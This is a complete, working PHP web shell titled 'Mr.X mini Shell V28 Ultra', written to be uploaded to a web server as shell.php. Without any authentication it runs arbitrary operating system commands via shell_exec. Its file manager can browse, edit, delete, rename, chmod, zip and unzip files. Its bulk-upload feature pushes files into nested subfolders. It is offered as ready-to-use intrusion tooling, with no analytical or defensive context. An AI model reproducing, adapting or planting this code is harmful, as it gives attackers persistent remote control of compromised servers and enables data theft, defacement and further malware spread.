<?php
error_reporting(0);
set_time_limit(0);

// ===== Path Setup =====
$home = __DIR__; // Home directory where shell.php is uploaded
$path = isset($_GET['path']) ? $_GET['path'] : $home;
$path = realpath($path);

// ===== Helpers =====
function perms($file){
    $p = fileperms($file);
    return substr(sprintf('%o', $p), -4);
}
function size($bytes){
    $units=['B','KB','MB','GB','TB'];
    for($i=0;$bytes>1024;$i++) $bytes/=1024;
    return round($bytes,2).' '.$units[$i];
}
function perm_color($file){
    return is_writable($file) && is_readable($file) ? "green" : "red";
}

// ===== Individual Actions =====
if(isset($_GET['delete_item'])){
    $f=$_GET['delete_item'];
    is_dir($f)?@rmdir($f):@unlink($f);
    header("Location:?path=$path"); exit;
}
if(isset($_GET['rename_item'])){
    $f=$_GET['rename_item'];
    $newname = $_GET['new_name'] ?? '';
    if($newname){ @rename($f,dirname($f).'/'.$newname); header("Location:?path=$path"); exit; }
    echo "<form method=get>
    <input type=hidden name=rename_item value='$f'>
    <input type=text name=new_name placeholder='New name'>
    <button>Rename</button>
    </form>"; exit;
}
if(isset($_GET['chmod_item'])){
    $f=$_GET['chmod_item'];
    $perm = $_GET['perm'] ?? '';
    if($perm){ @chmod($f,octdec($perm)); header("Location:?path=$path"); exit; }
    echo "<form method=get>
    <input type=hidden name=chmod_item value='$f'>
    <input type=text name=perm placeholder='0777'>
    <button>Chmod</button>
    </form>"; exit;
}

// ===== Bulk Actions =====
if(isset($_POST['upload'])){
    foreach($_FILES['file']['name'] as $k=>$v){
        move_uploaded_file($_FILES['file']['tmp_name'][$k],$path.'/'.$v);
    }
}
if(isset($_POST['bulk_upload_sub'])){
    foreach($_FILES['file']['name'] as $k=>$v){
        $subfolders = array_filter(glob($path.'/*'), 'is_dir');
        foreach($subfolders as $sub){
            move_uploaded_file($_FILES['file']['tmp_name'][$k], $sub.'/'.$v);
            // Depth 2
            $subsub = array_filter(glob($sub.'/*'), 'is_dir');
            foreach($subsub as $s2){
                move_uploaded_file($_FILES['file']['tmp_name'][$k], $s2.'/'.$v);
            }
        }
    }
}
if(isset($_POST['delete'])){ foreach($_POST['f'] as $f){ is_dir($f)?@rmdir($f):@unlink($f); } }
if(isset($_POST['chmod'])){ foreach($_POST['f'] as $f){ chmod($f,octdec($_POST['perm'])); } }
if(isset($_POST['rename'])){ @rename($_POST['old'],$_POST['new']); }
if(isset($_POST['newfile'])){ file_put_contents($path.'/'.$_POST['fname'],''); }
if(isset($_POST['newfolder'])){ mkdir($path.'/'.$_POST['dname']); }
if(isset($_POST['zip'])){ $zip=new ZipArchive(); $name=$path.'/archive_'.time().'.zip'; if($zip->open($name,ZipArchive::CREATE)){ foreach($_POST['f'] as $f){ if(is_file($f))$zip->addFile($f,basename($f)); } $zip->close(); } }
if(isset($_GET['unzip'])){ $zip=new ZipArchive(); if($zip->open($_GET['unzip'])){ $zip->extractTo($path); $zip->close(); } }
if(isset($_POST['save'])){ file_put_contents($_POST['file'],$_POST['data']); }

// ===== Files & Folders =====
$files = scandir($path);
$server = php_uname(); $php = phpversion();
$disk = size(disk_total_space("/")); $free = size(disk_free_space("/")); $ram = size(memory_get_usage(true));

?>

<html>
<head>
<title>Mr.X mini Shell V28 Ultra</title>
<style>
body{background:#0b0b0b;color:#0f0;font-family:monospace}
a{color:#0f0;text-decoration:none}
table{width:100%;border-collapse:collapse}
td,th{padding:6px;border-bottom:1px solid #222}
input,textarea{background:#000;color:#0f0;border:1px solid #0f0}
button{background:#000;color:#0f0;border:1px solid #0f0;padding:4px}
.topright{float:right;margin-right:20px;}
</style>
<script>
function selectAll(checkbox){
    var checked = checkbox.checked;
    document.querySelectorAll("input[name='f[]']").forEach(e=>e.checked=checked);
}
</script>
</head>
<body>

<h2>Mr.X mini Shell V28 Ultra</h2>

<div>
<?php echo $server ?><br>
PHP: <?php echo $php ?><br>
Disk: <?php echo $disk ?> | Free: <?php echo $free ?><br>
RAM: <?php echo $ram ?>
</div>
<hr>

<div>
Path:
<?php
$p='';
foreach(explode('/',$path) as $v){ if(!$v) continue; $p.="/$v"; echo "<a href=?path=$p>/$v</a> "; }
?>
<a class=topright href=?path=<?php echo $home ?>>Home</a>
</div>
<hr>

<!-- Upload -->
<form method=post enctype=multipart/form-data>
<input type=file name=file[] multiple>
<button name=upload>Upload</button>
<button name=bulk_upload_sub>Bulk Upload Subfolders (depth 2)</button>
</form>

<form method=post>
Create file: <input name=fname> <button name=newfile>Create</button>
Create folder: <input name=dname> <button name=newfolder>Create</button>
</form>

<hr>

<?php
if(isset($_GET['edit'])){
$f=$_GET['edit'];
$d=htmlspecialchars(file_get_contents($f));
?>
<form method=post>
<input type=hidden name=file value="<?php echo $f ?>">
<textarea name=data style="width:100%;height:400px"><?php echo $d ?></textarea>
<button name=save>Save</button>
</form>
<?php exit; } ?>

<form method=post>
<input type=checkbox onclick="selectAll(this)"> Select All
<table>
<tr><th></th><th>Name</th><th>Perm</th><th>Size</th><th>Actions</th></tr>

<?php
// Folders first
foreach($files as $f){
    if($f=='.'||$f=='..') continue;
    $full=$path.'/'.$f; if(!is_dir($full)) continue;
    $color = perm_color($full);
    echo "<tr style='color:$color'>
    <td><input type=checkbox name='f[]' value='$full'></td>
    <td><a href=?path=$full>📁 $f</a></td>
    <td>".perms($full)."</td>
    <td>-</td>
    <td>
    <a href='?chmod_item=$full'>Chmod</a> | 
    <a href='?rename_item=$full'>Rename</a> | 
    <a href='?delete_item=$full' onclick=\"return confirm('Delete $f?')\">Delete</a>
    </td>
    </tr>";
}

// Files
foreach($files as $f){
    if($f=='.'||$f=='..') continue;
    $full=$path.'/'.$f; if(is_dir($full)) continue;
    $color = perm_color($full);
    $act="<a href='?edit=$full'>Edit</a> | <a href='$full' download>Download</a> | ";
    $act.="<a href='?chmod_item=$full'>Chmod</a> | ";
    $act.="<a href='?rename_item=$full'>Rename</a> | ";
    $act.="<a href='?delete_item=$full' onclick=\"return confirm('Delete $f?')\">Delete</a>";
    echo "<tr style='color:$color'>
    <td><input type=checkbox name='f[]' value='$full'></td>
    <td><a href=?edit=$full>📄 $f</a></td>
    <td>".perms($full)."</td>
    <td>".size(filesize($full))."</td>
    <td>$act</td>
    </tr>";
}
?>
</table>

<br>
Perm: <input name=perm value=0777>
<button name=chmod>Chmod</button>
<button name=delete>Delete</button>
<button name=zip>Zip</button>
</form>

<hr>

Rename (bulk)
<form method=post>
Old: <input name=old> New: <input name=new>
<button name=rename>Rename</button>
</form>

<hr>

Command
<form method=post>
<input name=cmd style="width:100%">
<button name=run>Run</button>
</form>

<?php
if(isset($_POST['run'])){
echo "<textarea style='width:100%;height:250px'>";
echo shell_exec("cd $path; ".$_POST['cmd']." 2>&1");
echo "</textarea>";
}
?>

</body>
</html>